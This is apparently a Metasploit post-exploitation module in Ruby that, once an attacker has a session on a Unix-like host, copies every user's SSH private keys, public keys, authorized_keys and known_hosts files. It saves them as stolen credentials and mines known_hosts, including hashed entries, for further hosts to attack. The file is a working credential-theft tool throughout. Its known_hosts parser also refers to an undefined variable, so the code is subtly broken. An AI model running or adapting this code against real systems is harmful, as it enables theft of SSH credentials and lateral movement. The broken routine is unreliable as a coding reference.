##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Post
  LOOPBACK_ADDRS = ['localhost', '127.0.0.1', '::1'].freeze

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather OpenSSH PKI Credentials Collection',
        'Description' => %q{
          This module will collect the contents of all users' .ssh directories on the targeted
          machine. Additionally, known_hosts and authorized_keys and any other files are also
          downloaded. This module is largely based on firefox_creds.rb.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jim Halfpenny',
          'g0tmi1k' # @g0tmi1k - additional features
        ],
        'Platform' => %w[bsd linux osx unix],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_ls
              stdapi_fs_separator
            ]
          }
        },
        'References' => [
          ['ATT&CK', Mitre::Attack::Technique::T1552_004_PRIVATE_KEYS]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('PARSE_KNOWN_HOSTS', [false, 'Parse plaintext known_hosts entries and store as workspace hosts', true]),
        OptBool.new('CRACK_KNOWN_HOSTS', [false, 'Attempt to identify hashed known_hosts entries by checking against workspace hosts', true])
      ]
    )
  end

  def run
    print_status('Finding .ssh directories')
    paths = enum_user_directories.map { |d| d + '/.ssh' }
    # Array#select! is only in 1.9
    paths = paths.select { |d| directory?(d) }

    if paths.nil? || paths.empty?
      print_error('No users found with a .ssh directory')
      return
    end

    print_status("Looting #{paths.count} .ssh directories")
    download_loot(paths)
  end

  def download_loot(paths)
    paths.each do |path|
      path.chomp!

      print_status("Looting #{path} directory")

      unless executable?(path)
        print_warning("Cannot access directory: #{path} - Missing execute permission")
        next
      end

      begin
        if session.type == 'meterpreter'
          sep = session.fs.file.separator
          files = session.fs.dir.entries(path)
        else
          sep = '/'
          files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
        end
      rescue StandardError => e
        print_warning("Cannot access directory: #{path} - #{e.message}")
        next
      end

      user = File.basename(File.dirname(path))
      vprint_status("User: #{user}")
      files.each do |file|
        next if ['.', '..'].include?(file)

        file_path = "#{path}#{sep}#{file}"

        unless readable?(file_path)
          print_warning("Cannot read file: #{file_path} - Missing read permission")
          next
        end

        data = read_file(file_path)
        file = file.split(sep).last

        # Consistency with: ./modules/auxiliary/scanner/ssh/ssh_key_login.rb, ./modules/exploits/multi/persistence/ssh_key.rb & ./modules/post/multi/gather/ssh_creds.rb
        ktype = file[/\Aid_(\w+)\z/, 1]
        pub_ktype = file[/\Aid_(\w+)\.pub\z/, 1]
        ltype = if ktype
                  "ssh.privatekey.#{ktype}"
                elsif pub_ktype
                  "ssh.publickey.#{pub_ktype}"
                else
                  "ssh.#{user}.#{file.tr('.', '_')}"
                end

        lname = if ktype
                  "#{user}_id_#{ktype}"
                elsif pub_ktype
                  "#{user}_id_#{pub_ktype}.pub"
                else
                  "#{user}_#{file}"
                end

        linfo = if ktype && data.to_s.include?('PRIVATE KEY')
                  begin
                    k = Net::SSH::KeyFactory.load_data_private_key(data, nil, false)
                    k.fingerprint('SHA256')
                  rescue StandardError
                    "OpenSSH #{ktype.upcase} private key for #{user}"
                  end
                elsif ktype
                  "OpenSSH #{ktype.upcase} private key for #{user}"
                elsif pub_ktype
                  begin
                    k = Net::SSH::KeyFactory.load_data_public_key(data.strip)
                    k.fingerprint('SHA256')
                  rescue StandardError
                    "OpenSSH #{pub_ktype.upcase} public key for #{user}"
                  end
                else
                  "OpenSSH #{file} File"
                end

        loot_path = store_loot(
          ltype,
          'text/plain',
          session,
          (data.to_s.chomp + "\n"),
          lname,
          linfo
        )
        print_good("Downloaded: #{file_path} -> #{loot_path}")

        if file == 'known_hosts'
          parse_known_hosts(data) if datastore['PARSE_KNOWN_HOSTS']
          crack_hashed_known_hosts(data) if datastore['CRACK_KNOWN_HOSTS']
        else
          store_ssh_key(data, user, file)
        end
      end
    end
  end

  def store_ssh_key(data, user, filename)
    return unless data.to_s.include?('PRIVATE KEY')

    begin
      key = Net::SSH::KeyFactory.load_data_private_key(data, nil, false)

      create_credential(
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :ssh_key,
        private_data: data,
        username: user,
        workspace_id: myworkspace_id,
        address: session.session_host,
        port: 22,
        service_name: 'ssh',
        protocol: 'tcp'
      )

      report_note(
        host: session.session_host,
        port: 22,
        proto: 'tcp',
        sname: 'ssh',
        type: 'ssh.privatekey',
        data: { user: user, file: filename, fingerprint: key.fingerprint('SHA256') },
        update: :unique_data
      )

      print_good("Stored SSH private key (#{filename}) for user: #{user}")
    rescue Net::SSH::KeyFactory::KeyManagerError
      print_warning("SSH private key (#{filename}) is passphrase-protected - stored as loot but not parsed")
    rescue StandardError => e
      print_warning("Could not parse SSH private key in #{filename}: #{e.message}")
    end
  end

  def parse_known_hosts(data)
    hosts_found = 0

    data.each_line do |line|
      line.strip!
      next if line.empty? || line.start_with?('#')
      next if line.start_with?('|') # hashed entries (|1|...) cannot be reversed

      hosts_field = line.split(' ').first
      next unless hosts_field

      hosts_field.split(',').each do |entry|
        host = entry.gsub(/\A\[/, '').gsub(/\]:\d+\z/, '') # strip [host]:port brackets
        next if host.empty?

        hosts_found += 1

        resolved = LOOPBACK_ADDRS.include?(host) ? session.session_host : host
        vprint_good("Found host in known_hosts: #{host}#{" (#{resolved})" if resolved != host}")
        report_host(host: resolved, info: 'Discovered via SSH known_hosts')
      end
    end

    msg = "Parsed #{hosts_found} host #{'entry'.pluralize(hosts_found)} from known_hosts"
    matched > 0 ? print_status(msg) : vprint_status(msg)
  end

  def crack_hashed_known_hosts(data)
    return unless framework.db.active

    candidates = framework.db.hosts(workspace: myworkspace).flat_map { |h| [h.address, h.name].compact }
    candidates += LOOPBACK_ADDRS
    candidates.uniq!

    matched = 0
    data.each_line do |line|
      line.strip!
      next unless line.start_with?('|1|')

      _, _, salt_b64, hash_b64 = line.split(' ').first.split('|')
      salt = Base64.decode64(salt_b64)

      candidates.each do |host|
        computed = Base64.strict_encode64(OpenSSL::HMAC.digest('SHA1', salt, host))
        next unless computed == hash_b64

        matched += 1

        resolved = LOOPBACK_ADDRS.include?(host) ? session.session_host : host
        vprint_good("Matched hashed known_hosts entry: #{host}#{" (#{resolved})" if resolved != host}")
        report_host(host: resolved, info: 'Matched via hashed SSH known_hosts')
      end
    end

    msg = "Matched #{matched} hashed #{'entry'.pluralize(matched)} against workspace hosts"
    matched > 0 ? print_status(msg) : vprint_status(msg)
  end
end
